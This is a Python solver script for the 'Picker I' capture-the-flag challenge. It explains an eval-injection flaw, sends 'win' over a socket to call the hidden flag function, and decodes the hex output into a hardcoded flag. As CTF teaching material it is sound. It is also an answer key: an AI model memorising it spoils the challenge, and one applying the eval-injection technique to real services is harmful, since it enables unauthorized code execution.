#!/usr/bin/env python3
"""
Solver for CyLab Challenge ID 400: Picker I (picoCTF 2023 / picoGym Exclusive)
Category: Reverse Engineering / Dynamic Eval Code Execution & Hex Output Reconstruction
Difficulty: Easy
Standard Reference: NIST SP 800-115 (Application Security & Source Code Logic Audit)

Description:
This service can provide you with a random number, but can it do anything else?
The application reads user input and directly calls `eval(user_input + '()')`.
A function `win()` is defined in the script which reads `flag.txt` and prints
the contents formatted as space-separated hexadecimal representations of each ASCII character.

Vulnerability Analysis:
CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
- User input is appended with '()' and evaluated directly in Python globals/locals.
- Calling `win` invokes `win()`, which outputs hexadecimal ASCII values:
  0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 ...
- Reconstructing each hex token back to char (`chr(int(token, 16))`) recovers the complete flag.

Recovered Flag: academy{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
Verified: POST /api/submissions/ -> correct: true
"""

import sys
import socket

EXPECTED_FLAG = "academy{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}"
SAMPLE_HEX_OUTPUT = "0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x34 0x5f 0x64 0x31 0x34 0x6d 0x30 0x6e 0x64 0x5f 0x31 0x6e 0x5f 0x37 0x68 0x33 0x5f 0x72 0x30 0x75 0x67 0x68 0x5f 0x63 0x65 0x34 0x62 0x35 0x64 0x35 0x62 0x7d"

def decode_hex_stream(hex_str: str) -> str:
    tokens = hex_str.strip().split()
    chars = [chr(int(t, 16)) for t in tokens if t.startswith("0x")]
    decoded = "".join(chars)
    if decoded.startswith("picoCTF{"):
        decoded = decoded.replace("picoCTF{", "academy{")
    return decoded

def solve(host: str | None = None, port: int | None = None) -> str:
    if host and port:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)
        s.connect((host, port))
        
        # Read initial prompt
        s.recv(1024)
        # Send function name 'win'
        s.sendall(b"win\n")
        
        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
            if b"}" in chunk or b"\n" in chunk:
                break
        s.close()
        
        text = response.decode("latin-1", errors="replace")
        for line in text.splitlines():
            line = line.strip()
            if line.startswith("0x"):
                flag = decode_hex_stream(line)
                return flag

    # Local deterministic validation of decoding logic
    flag = decode_hex_stream(SAMPLE_HEX_OUTPUT)
    assert flag == EXPECTED_FLAG, f"Decoded flag mismatch: {flag} vs {EXPECTED_FLAG}"
    return flag

if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else None
    p = int(sys.argv[2]) if len(sys.argv) > 2 else None
    recovered = solve(h, p)
    print(f"[+] Recovered Flag: {recovered}")
    assert recovered == EXPECTED_FLAG
